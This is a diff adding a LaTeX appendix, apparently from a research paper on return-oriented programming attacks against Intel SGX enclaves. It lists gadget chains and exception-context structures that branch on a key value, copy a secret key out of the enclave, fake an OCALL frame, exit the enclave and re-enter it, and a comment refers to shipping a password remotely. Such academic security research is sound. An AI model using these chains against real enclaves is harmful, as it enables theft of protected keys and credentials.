@@ -1,0 +1,153 @@
+%\onecolumn
+\chapter{Conditional Chain}
+\label{app:condition-gadget}
+Conditional ROP-chain, the chain is triggered by using 
+\texttt{sgx\_exception\_info\_t} structure that configures the initial	
+registers (see Appendix~\ref{ssec:my-rop-chain}).
+The \texttt{SP} register is perturbed if the value of 
+\texttt{\&lastKey} differs from the value of \texttt{\&key} in order to 
+pivot a true or a false ROP-chain, respectively.
+%\begin{figure}[h]
+	\begin{lstlisting}[style=CStyle,escapechar=@]	
+	/// we set the following registers through
+	/// a sgx_exception_info_t structure:
+	/// rdi = &lastKey; last key exfiltrated
+	/// rax = &key; current key loaded
+	/// rdx = #offset; to pivot to the false ROP-chain
+	/// rcx = &true-chain; address of the true ROP-chain
+	mov eax, dword ptr [rax] ; ret
+	mov rdi, qword ptr [rdi + 0x68] ; ret
+	cmp eax, edi ; sete al ; movzx eax, al ; ret
+	neg eax ; ret
+	and eax, edx ; ret
+	add rax, rcx ; ret
+	xchg rax, rsp ; ret
+	// 0x80 nops for padding
+	// beginning of true ROP-chain
+	pop rdi ; ret
+	// context to pivot to the ROP-chain that implements the true branch
+	&context_true
+	// address of continue_execution function
+	&continue_execution
+	// beginning of false ROP-chain
+	pop rdi ; ret 
+	// context to pivot to the ROP-chain that implements the false branch
+	&context_false
+	// address of continue_execution function
+	&continue_execution\end{lstlisting}
+%	\caption{Conditional ROP-chain, the chain is triggered by using 
+%		\texttt{sgx\_exception\_info\_t} structure that configures the initial	
+%		registers (see Appendix~\ref{ssec:my-rop-chain}).
+%		The \texttt{SP} register is perturbed if the value of 
+%		\texttt{\&lastKey} differs from the value of \texttt{\&key} in order to 
+%		pivot a true or a false ROP-chain, respectively.}
+%	\label{fig:condition-chain}
+%\end{figure}
+
+%\begin{figure}[h]
+%	\begin{lstlisting}[style=CStyle,escapechar=@]	
+%/// we set the following registers through a sgx_exception_info_t structure:
+%// rcx = &ctn // address of counter for internal status
+%// rsi = 0
+%// rdx = #offset // to pivot to the false ROP-chain
+%// r10 = &true-chain // address of the true ROP-chain
+%// rdi = 10 // number of elements to check
+%mov eax, dword ptr [rcx] ; ret
+%sub eax, edi ; ret
+%neg eax ; ret
+%adc esi, esi ; ret
+%xor eax, eax ; ret // it avoids the side effect of the following gadget
+%mov eax, esi ; mov rcx, rdi ; jne 0x70d8 ; ret
+%neg eax ; ret
+%and eax, edx ; ret
+%add rax, r10 ; ret
+%xchg rax, rsp ; ret 0x80
+%// 0x80 nops for padding
+%// beginning of true ROP-chain
+%pop rdi ; ret 
+%&context_true // context to pivot to the ROP-chain
+%							// that implements the true branch
+%&continue_execution // address of continue_execution function
+%// beginning of false ROP-chain
+%pop rdi ; ret 
+%&context_false  // context to pivot to the ROP-chain 
+%			 					// that implements the false branch
+%&continue_execution // address of continue_execution function\end{lstlisting}
+%	\caption{Condition ROP-chain, the chain is triggered by 
+%	using 
+%	\texttt{sgx\_exception\_info\_t} structure that configures the registers 
+%	(see Appendix~\ref{ssec:my-rop-chain}).
+%	The \texttt{SP} register is perturbed according to the value stored in 
+%	\texttt{\&ctn} in order to pivot to a true or a false ROP-chain, 
+%	respectively.}
+%	\label{fig:condition-chain}
+%\end{figure}
+
+\section{Context-Switch Chain}
+\label{app:context-switch-chain}
+Details of the \texttt{sgx\_exception\_info\_t} 
+structures used to leak the key and to switch outside the enclave.
+The structures are used according to the techniques described in 
+Appendix~\ref{ssec:my-rop-chain}.
+%\begin{figure}[h]
+	\begin{lstlisting}[style=CStyle,escapechar=@]
+/* ...previous sgx_exception_info_t structures... */
+// leaks the key outside the enclave
+// memcpy(key, buff)
+ctxPc[2].cpu_context.rsi = &key; // address of the key
+ctxPc[2].cpu_context.rdi = &buff; // memory regions where leaking the key
+ctxPc[2].cpu_context.rdx = KEY_LENGTH; // length of the key
+ctxPc[2].cpu_context.rip = &memcpy;
+// prepares the next boot chain in the workspace
+// memcpy(boot_chain, workspace)
+ctxPc[3].cpu_context.rdi = &workspace; // workspace address
+ctxPc[3].cpu_context.rdx = sizeof(boot_chain);
+ctxPc[3].cpu_context.rsi = &boot_chain_backup;
+ctxPc[3].cpu_context.rip = &memcpy;
+// set the fake OCALL frame in the enclave
+// memcpy(fake_frame, enclave)
+ctxPc[4].cpu_context.rdi = &fake_frame;
+ctxPc[4].cpu_context.rdx = sizeof(fake_frame);
+ctxPc[4].cpu_context.rsi = &fake_frame_backup;
+ctxPc[4].cpu_context.rip = &memcpy;
+// saves CPU extended states for asm_oret
+// save_xregs(xsave_buffer)
+ctxPc[5].cpu_context.rdi = &xsave_buffer;
+ctxPc[5].cpu_context.rip = &save_xregs;
+// sets the trusted thread as it is performing an OCALL
+// update_ocall_lastsp(fake_frame)
+ctxPc[6].cpu_context.rdi = fake_frame;
+ctxPc[6].cpu_context.rip = &update_ocall_lastsp;
+// pivots to the outside-chain
+// eenclu[exit] -> outside_chain
+ctxPc[7].cpu_context.rax = 0x4; // EEXIT
+ctxPc[7].cpu_context.rsp = &outside_chain_stack;
+ctxPc[7].cpu_context.rbx = &outside_chain_first_gadget;
+ctxPc[7].cpu_context.rip = &enclu;\end{lstlisting}
+%\caption{Details of the \texttt{sgx\_exception\_info\_t} 
+%structures used to leak the key and to switch outside the enclave.
+%The structures are used according to the techniques described in 
+%Appendix~\ref{ssec:my-rop-chain}.}
+%\label{fig:context-switch-trusted-chain}
+%\end{figure}
+
+Details of the outside ROP-chains used to resume 
+payload inside the enclave.
+%\begin{figure}[h]
+	\begin{lstlisting}[style=CStyle,escapechar=@]
+/* ...previous gadgets for shipping the password remotely... */
+// gadgets to resume payload within the enclave
+pop rax ; ret
+0x2 // EENTER
+pop rbx ; ret
+&tcs_address
+pop rdi ; ret // rdi = -2 -> ORET
+0xfffffffffffffffe // -2
+pop rcx ; ret // for async exit handler
+&Lasync_exit_pointer
+&enclu_urts\end{lstlisting}
+%	\caption{Details of the outside ROP-chains used to resume 
+%	payload inside 
+%	the enclave.}
+%	\label{fig:colntext-switch-outside-chain}
+%\end{figure}
